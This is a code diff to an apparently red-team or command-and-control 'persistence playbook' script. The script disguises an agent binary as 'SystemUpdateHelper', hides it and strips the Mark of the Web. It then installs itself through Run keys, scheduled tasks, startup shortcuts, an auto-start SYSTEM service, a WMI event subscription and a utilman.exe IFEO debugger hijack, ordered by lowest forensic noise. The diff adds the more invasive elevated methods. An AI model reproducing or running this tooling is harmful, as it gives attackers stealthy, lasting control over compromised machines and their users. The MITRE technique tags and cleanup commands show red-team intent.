@@ -3,11 +3,11 @@
 // Automated persistence playbook.
 //
 // Mirrors the full behaviour of the Rust `persist:*` handlers:
-//   1. stable_drop — copies the binary to a platform-specific hidden
+//   1. stable_drop - copies the binary to a platform-specific hidden
 //      location and renames it to LABEL, so persistence points at a
 //      stable path rather than wherever the agent was first launched.
 //   2. Platform detection and privilege check.
-//   3. Ordered method playbook — lowest forensic noise first, stops on
+//   3. Ordered method playbook - lowest forensic noise first, stops on
 //      first success.
 //   4. Structured JSON return for the IOC tracker.
 //
@@ -45,7 +45,7 @@
 // ── Config ────────────────────────────────────────────────────────────
 let LABEL = "SystemUpdateHelper";
 // In Rhai, trim() mutates the string in-place and returns ().
-// Do NOT chain .len() on its result — assign first, then check length.
+// Do NOT chain .len() on its result - assign first, then check length.
 if args.len() > 0 {
     let a = args[0];
     a.trim();           // mutate in place
@@ -77,10 +77,20 @@ let platform   = if is_windows { "windows" } else if is_macos { "macos" } else {
 
 print_log("[auto_persist] platform=" + platform + "  label=" + LABEL);
 
+// JSON escaping for paths: every backslash must double, quotes become single.
+// Without this, any Windows path (C:\Users\...) breaks the returned JSON.
+fn jesc(s) {
+    let r = s;
+    r.replace("\\", "\\\\");
+    r.replace("\"", "'");
+    r
+}
+
+
 
 // ── Locate the running binary ─────────────────────────────────────────
 // internal_self_path() calls std::env::current_exe() in the agent process
-// directly — no subprocess, works on all platforms.  DO NOT use exec_os
+// directly - no subprocess, works on all platforms.  DO NOT use exec_os
 // subprocess tricks here: /proc/self/exe inside an exec_os child points
 // to the child binary (e.g. readlink), not the agent.  On Windows the
 // nested powershell returns powershell.exe.  On macOS $PPID varies.
@@ -130,7 +140,7 @@ if is_linux || is_macos {
         self_path == "/usr/bin/perl" || self_path.contains("/perl");
 }
 if is_interpreter && CUSTOM_BINARY.len() < 3 {
-    let sb_e = self_path;
+    let sb_e = jesc(self_path);
     return "{\"result\":\"error\"," +
            "\"detail\":\"Agent is running inside a host process (\" + sb_e + \"). " +
            "Provide the agent EXE path as a second argument: " +
@@ -144,7 +154,7 @@ print_log("[auto_persist] binary=" + self_path);
 // ── Privilege detection ───────────────────────────────────────────────
 let is_elevated = false;
 if is_windows {
-    // PowerShell-native elevation check — fast, no WMI, no network calls.
+    // PowerShell-native elevation check - fast, no WMI, no network calls.
     // exec_os already runs through PowerShell on Windows so this is a single
     // PS process call.  `whoami /groups` blocks for 2-5 minutes on
     // domain-joined machines waiting for a DC; do not use it here.
@@ -164,7 +174,7 @@ let priv_level = if is_elevated { "elevated" } else { "user" };
 print_log("[auto_persist] privilege=" + priv_level);
 
 // ═══════════════════════════════════════════════════════════════════════
-// stable_drop — copy binary to a persistent, hidden location and rename
+// stable_drop - copy binary to a persistent, hidden location and rename
 //               it to LABEL (mirrors the Rust persistence handlers).
 //
 //   Windows  %APPDATA%\Microsoft\<LABEL>.exe
@@ -172,7 +182,7 @@ print_log("[auto_persist] privilege=" + priv_level);
 //   macOS    ~/Library/Application Support/<LABEL>/<LABEL>  chmod 755
 //
 // Idempotent: if self_path is already the stable location, skip copy.
-// Aborts the entire script if the copy cannot be made — persistence
+// Aborts the entire script if the copy cannot be made - persistence
 // pointing at a volatile source path has no operational value.
 // ═══════════════════════════════════════════════════════════════════════
 
@@ -206,7 +216,7 @@ if is_windows {
         );
 
         // Copy to stable path and strip Zone.Identifier (Mark of the Web) in
-        // ONE exec_os_timeout call — one PowerShell cold-start covers both.
+        // ONE exec_os_timeout call - one PowerShell cold-start covers both.
         //
         // The previous two-call design had a race: Copy-Item consumed the 30 s
         // budget, then Unblock-File got only 5 s which could be entirely spent
@@ -214,9 +224,9 @@ if is_windows {
         //
         // Three independent strip methods so MOTW is removed even in
         // Constrained Language Mode (CLM) where some methods silently fail:
-        //   1. cmd /c copy — never copies ADS at the OS level
-        //   2. Remove-Item -Stream — FileSystem provider, works in CLM
-        //   3. Unblock-File       — belt-and-suspenders; may fail in CLM
+        //   1. cmd /c copy - never copies ADS at the OS level
+        //   2. Remove-Item -Stream - FileSystem provider, works in CLM
+        //   3. Unblock-File       - belt-and-suspenders; may fail in CLM
         //
         // Paths assigned to PS vars first so spaces in AppData dirs are safe.
         exec_os_timeout(
@@ -261,8 +271,8 @@ if is_windows {
 }
 
 if !stable_ok {
-    let sp_e = stable_path; sp_e.replace("\"", "'");
-    let sb_e = self_path;   sb_e.replace("\"", "'");
+    let sp_e = jesc(stable_path);
+    let sb_e = jesc(self_path);
     return "{\"result\":\"error\"," +
            "\"detail\":\"stable_drop failed — could not copy to " + sp_e + "\"," +
            "\"platform\":\"" + platform + "\"," +
@@ -272,7 +282,7 @@ if !stable_ok {
 print_log("[auto_persist] stable_path=" + stable_path);
 
 // ── Already-persisted fast-path ───────────────────────────────────────
-// Check whether stable_path is already registered, not self_path —
+// Check whether stable_path is already registered, not self_path -
 // by this point stable_path is the authoritative path for this agent.
 
 let already = "";
@@ -296,8 +306,8 @@ if is_windows {
 }
 
 if already != "" {
-    let sb_e = stable_path; sb_e.replace("\"", "'");
-    let s_e  = self_path;   s_e.replace("\"", "'");
+    let sb_e = jesc(stable_path);
+    let s_e  = jesc(self_path);
     print_log("[auto_persist] already persisted via " + already);
     return "{\"result\":\"already_persisted\"," +
            "\"method\":\"" + already + "\"," +
@@ -314,25 +324,43 @@ let ioc_type       = "";
 let ioc_path       = "";
 let ioc_detail     = "";
 let ioc_cleanup    = "";
+let skipped_elevated = "";   // methods skipped for privilege (windows only)
 
 // ═══════════════════════════════════════════════════════════════════════
 // WINDOWS PLAYBOOK  (all commands reference stable_path)
+//
+// Privilege-adaptive, read-back-validated, lowest forensic noise first:
+//   user level    : HKCU Run → Scheduled Task (onlogon) → Startup .lnk
+//   elevated only : HKLM Run → Windows Service → WMI subscription → IFEO
+//
+// Elevated methods are attempted ONLY when elevated AND every user-level
+// method failed; when skipped for privilege they are listed in the output
+// "skipped_elevated" field. Every method verifies its artifact with a
+// read-back before claiming success - command output text is localized on
+// Windows, artifacts are not.
 // ═══════════════════════════════════════════════════════════════════════
 
 if is_windows {
 
     // ── Method 1: HKCU Registry Run Key ─────────────── T1547.001 ──
     // No elevation.  Fires at user logon.  REG_SZ → stable_path.
-    // Noise: LOW.  Detection: Sysmon 13, ETW Registry.
+    // Noise: LOW.  Detection: Sysmon 12/13, ETW Registry.
     if success_method == "" {
         let rk = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-        let out = exec_os(
+        exec_os_timeout(
             "reg add \"" + rk + "\" /v \"" + LABEL +
-            "\" /t REG_SZ /d \"" + stable_path + "\" /f 2>&1"
+            "\" /t REG_SZ /d \"" + stable_path + "\" /f",
+            10
         );
-        let ok = out.contains("successfully");
-        let det = if ok { rk + "\\" + LABEL + " → " + stable_path } else { out };
-        det.replace("\"", "'");
+        // Read-back verification: the value either exists with our path or
+        // it does not - unlike `reg add` output text, this is not localized.
+        let vb = exec_os_timeout(
+            "reg query \"" + rk + "\" /v \"" + LABEL + "\" 2>$null",
+            8
+        );
+        let ok = vb.contains(stable_path);
+        let det = if ok { rk + "\\" + LABEL + " → " + stable_path + " (verified)" } else { vb };
+        det = jesc(det);
         if attempts_json.len() > 0 { attempts_json += ","; }
         attempts_json += "{\"method\":\"registry_run_hkcu\",\"technique\":\"T1547.001\"," +
             "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
@@ -350,14 +378,20 @@ if is_windows {
     // No elevation.  More robust than Run keys; survives profile resets.
     // Noise: MEDIUM.  Detection: Event 4698, schtasks.exe spawn.
     if success_method == "" {
-        let out = exec_os(
+        exec_os_timeout(
             "schtasks /create /tn \"" + LABEL +
             "\" /tr \"" + stable_path +
-            "\" /sc onlogon /rl limited /f 2>&1"
+            "\" /sc onlogon /rl limited /f",
+            15
         );
-        let ok = out.contains("SUCCESS") || out.contains("successfully");
-        let det = if ok { "Task \\" + LABEL + " (onlogon, limited) → " + stable_path } else { out };
-        det.replace("\"", "'");
+        // Read-back: query the task, not the (localized) create output.
+        let vb = exec_os_timeout(
+            "schtasks /query /tn \"" + LABEL + "\" /fo csv 2>$null",
+            10
+        );
+        let ok = vb.contains(LABEL);
+        let det = if ok { "Task \"" + LABEL + "\" (onlogon, limited) → " + stable_path + " (verified)" } else { vb };
+        det = jesc(det);
         if attempts_json.len() > 0 { attempts_json += ","; }
         attempts_json += "{\"method\":\"scheduled_task\",\"technique\":\"T1053.005\"," +
             "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
@@ -372,19 +406,24 @@ if is_windows {
     }
 
     // ── Method 3: Startup Folder .lnk shortcut ──────── T1547.001 ──
-    // No elevation.  Widely scanned by AV — last resort before HKLM.
+    // No elevation.  Widely scanned by AV - last resort before HKLM.
     // Noise: HIGH.  Detection: Sysmon 11 (file create in startup path).
     if success_method == "" {
         let startup = exec_os_timeout("[Environment]::GetFolderPath('Startup')", 5);
         startup.trim(); startup.replace("\r\n",""); startup.replace("\n","");
-        let ps_cmd =
+        // FIX (was broken): the .lnk path was never constructed - the
+        // playbook crashed here on an undefined `lnk` whenever methods 1
+        // and 2 failed, leaving no persistence at all.
+        let lnk = startup + "\\" + LABEL + ".lnk";
+        exec_os_timeout(
             "$s=(New-Object -COM WScript.Shell).CreateShortcut('" + lnk +
-            "');$s.TargetPath='" + stable_path + "';$s.Save()";
-        exec_os_timeout(ps_cmd + " 2>$null", 15);
+            "');$s.TargetPath='" + stable_path + "';$s.Save()",
+            15
+        );
         let chk = exec_os_timeout("if (Test-Path -LiteralPath '" + lnk + "') { 'EXISTS' }", 5);
         let ok  = chk.contains("EXISTS");
-        let det = if ok { lnk + " → " + stable_path } else { "shortcut create failed" };
-        det.replace("\"", "'");
+        let det = if ok { lnk + " → " + stable_path + " (verified)" } else { "shortcut create failed" };
+        det = jesc(det);
         if attempts_json.len() > 0 { attempts_json += ","; }
         attempts_json += "{\"method\":\"startup_folder\",\"technique\":\"T1547.001\"," +
             "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
@@ -398,17 +437,30 @@ if is_windows {
         }
     }
 
-    // ── Method 4: HKLM Run Key (elevated only) ──────── T1547.001 ──
-    // System-wide; fires for every user.  Skipped without elevation.
+    // Elevated-only methods are attempted only when elevated AND all
+    // user-level methods failed.  When not elevated, record what was
+    // skipped so the operator knows an elevation path unlocks more options.
+    if !is_elevated {
+        skipped_elevated = "registry_run_hklm,windows_service,wmi_event_subscription,ifeo_debugger";
+    }
+
+    // ── Method 4: HKLM Run Key (elevated) ───────────── T1547.001 ──
+    // System-wide; fires for every user at logon.
+    // Noise: LOW-MEDIUM.  Detection: Sysmon 12/13.
     if success_method == "" && is_elevated {
         let rk = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-        let out = exec_os(
+        exec_os_timeout(
             "reg add \"" + rk + "\" /v \"" + LABEL +
-            "\" /t REG_SZ /d \"" + stable_path + "\" /f 2>&1"
+            "\" /t REG_SZ /d \"" + stable_path + "\" /f",
+            10
         );
-        let ok = out.contains("successfully");
-        let det = if ok { rk + "\\" + LABEL + " → " + stable_path } else { out };
-        det.replace("\"", "'");
+        let vb = exec_os_timeout(
+            "reg query \"" + rk + "\" /v \"" + LABEL + "\" 2>$null",
+            8
+        );
+        let ok = vb.contains(stable_path);
+        let det = if ok { rk + "\\" + LABEL + " → " + stable_path + " (verified)" } else { vb };
+        det = jesc(det);
         if attempts_json.len() > 0 { attempts_json += ","; }
         attempts_json += "{\"method\":\"registry_run_hklm\",\"technique\":\"T1547.001\"," +
             "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
@@ -419,6 +471,105 @@ if is_windows {
             ioc_type = "registry"; ioc_path = rk + "\\" + LABEL;
             ioc_detail = "HKLM Run (system-wide) → " + stable_path;
             ioc_cleanup = "persist:run_hklm_remove " + LABEL;
+        }
+    }
+
+    // ── Method 5: Windows Service (elevated) ────────── T1543.003 ──
+    // Auto-start service.  Created but NOT started (this agent is already
+    // running) - it fires at boot as SYSTEM.
+    // Noise: MEDIUM.  Detection: Event 4697, Sysmon 6 (driver), services.msc.
+    if success_method == "" && is_elevated {
+        exec_os_timeout(
+            "$p='" + stable_path + "'; " +
+            "sc.exe create '" + LABEL + "' binPath= ('\"' + $p + '\"') start= auto " +
+            "type= own",
+            12
+        );
+        // Read-back: the service either exists in SCM or it does not.
+        let vb = exec_os_timeout("sc.exe query \"" + LABEL + "\" 2>$null", 8);
+        let ok = vb.contains(LABEL) && vb.contains("STATE");
+        let det = if ok { "Service " + LABEL + " (auto, SYSTEM) → " + stable_path + " (verified)" } else { vb };
+        det = jesc(det);
+        if attempts_json.len() > 0 { attempts_json += ","; }
+        attempts_json += "{\"method\":\"windows_service\",\"technique\":\"T1543.003\"," +
+            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
+            "\"detail\":\"" + det + "\"," +
+            "\"cleanup_cmd\":\"shell sc.exe delete " + LABEL + "\"}";
+        if ok {
+            success_method = "windows_service"; success_tech = "T1543.003";
+            ioc_type = "service"; ioc_path = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\" + LABEL;
+            ioc_detail = "Windows service (auto, not started) → " + stable_path;
+            ioc_cleanup = "shell sc.exe delete " + LABEL;
+        }
+    }
+
+    // ── Method 6: WMI Event Subscription (elevated) ─── T1546.003 ──
+    // __EventFilter (logon session) + CommandLineEventConsumer + binding.
+    // Fires ~60s after each logon, SYSTEM context.  Survives most AV scans
+    // of disk/registry because it lives in the WMI repository.
+    // Noise: LOW-MEDIUM.  Detection: WMI-Activity ETW, mofcomp, Sysmon 19-21.
+    if success_method == "" && is_elevated {
+        let fname = LABEL + "F";
+        let cname = LABEL + "C";
+        exec_os_timeout(
+            "$f=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription " +
+            "-Arguments @{Name='" + fname + "';EventNamespace='root\\cimv2';QueryLanguage='WQL';" +
+            "Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'\"};" +
+            "$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription " +
+            "-Arguments @{Name='" + cname + "';CommandLineTemplate='\"" + stable_path + "\"'};" +
+            "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription " +
+            "-Arguments @{Filter=$f.__PATH;Consumer=$c.__PATH} | Out-Null",
+            25
+        );
+        // Read-back: the filter instance either exists or it does not.
+        let vb = exec_os_timeout(
+            "Get-WmiObject -Namespace root\\subscription -Class __EventFilter " +
+            "-Filter \"Name='" + fname + "'\" 2>$null | Select-Object -ExpandProperty Name",
+            10
+        );
+        let ok = vb.contains(fname);
+        let det = if ok { "WMI subscription " + fname + "/" + cname + " → " + stable_path + " (verified)" } else { vb };
+        det = jesc(det);
+        let wmi_clean = "shell Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='" + fname + "'\" | Remove-WmiObject; shell Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='" + cname + "'\" | Remove-WmiObject; shell Get-WmiObject -Namespace root\\subscription -Class __EventToConsumerBinding | Remove-WmiObject";
+        let wmi_clean_e = jesc(wmi_clean);
+        if attempts_json.len() > 0 { attempts_json += ","; }
+        attempts_json += "{\"method\":\"wmi_event_subscription\",\"technique\":\"T1546.003\"," +
+            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
+            "\"detail\":\"" + det + "\"," +
+            "\"cleanup_cmd\":\"" + wmi_clean_e + "\"}";
+        if ok {
+            success_method = "wmi_event_subscription"; success_tech = "T1546.003";
+            ioc_type = "wmi"; ioc_path = "root\\subscription\\__EventFilter:" + fname;
+            ioc_detail = "WMI event subscription (logon) → " + stable_path;
+            ioc_cleanup = wmi_clean_e;
+        }
+    }
+
+    // ── Method 7: IFEO Debugger (elevated) ──────────── T1546.012 ──
+    // utilman.exe runs as SYSTEM at the logon screen via Win+U.  The
+    // Debugger value hijacks that launch onto our stable binary.
+    // Noisy: utilman no longer opens the ease-of-access menu.  Last resort.
+    // Noise: MEDIUM.  Detection: Sysmon 12/13, IFEO key audits.
+    if success_method == "" && is_elevated {
+        let ifeo = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe";
+        exec_os_timeout(
+            "reg add \"" + ifeo + "\" /v Debugger /t REG_SZ /d \"" + stable_path + "\" /f",
+            10
+        );
+        let vb = exec_os_timeout("reg query \"" + ifeo + "\" /v Debugger 2>$null", 8);
+        let ok = vb.contains(stable_path);
+        let det = if ok { "IFEO utilman.exe Debugger → " + stable_path + " (verified)" } else { vb };
+        det = jesc(det);
+        if attempts_json.len() > 0 { attempts_json += ","; }
+        attempts_json += "{\"method\":\"ifeo_debugger\",\"technique\":\"T1546.012\"," +
+            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
+            "\"detail\":\"" + det + "\"," +
+            "\"cleanup_cmd\":\"shell reg delete \\\"" + jesc(ifeo) + "\\\" /v Debugger /f\"}";
+        if ok {
+            success_method = "ifeo_debugger"; success_tech = "T1546.012";
+            ioc_type = "registry"; ioc_path = ifeo + "\\Debugger";
+            ioc_detail = "IFEO Debugger (utilman.exe) → " + stable_path;
+            ioc_cleanup = "shell reg delete \"" + jesc(ifeo) + "\" /v Debugger /f";
         }
     }
 }
@@ -682,13 +833,13 @@ if !is_windows && !is_linux && !is_macos {
 // ── Build output JSON ─────────────────────────────────────────────────
 let result_str = if success_method != "" { "success" } else { "all_failed" };
 
-let s_e  = self_path;      s_e.replace("\"", "'");
-let sb_e = stable_path;    sb_e.replace("\"", "'");
-let sm_e = success_method; sm_e.replace("\"", "'");
-let st_e = success_tech;   st_e.replace("\"", "'");
-let ip_e = ioc_path;       ip_e.replace("\"", "'");
-let id_e = ioc_detail;     id_e.replace("\"", "'");
-let ic_e = ioc_cleanup;    ic_e.replace("\"", "'");
+let s_e  = jesc(self_path);
+let sb_e = jesc(stable_path);
+let sm_e = jesc(success_method);
+let st_e = jesc(success_tech);
+let ip_e = jesc(ioc_path);
+let id_e = jesc(ioc_detail);
+let ic_e = jesc(ioc_cleanup);
 
 let ioc_block = "";
 if success_method != "" {
@@ -713,4 +864,5 @@ return
     "\"method\":\"" + sm_e + "\"," +
     "\"technique\":\"" + st_e + "\"," +
     "\"attempts\":[" + attempts_json + "]" +
+    ",\"skipped_elevated\":\"" + skipped_elevated + "\"" +
     ioc_block + "}";
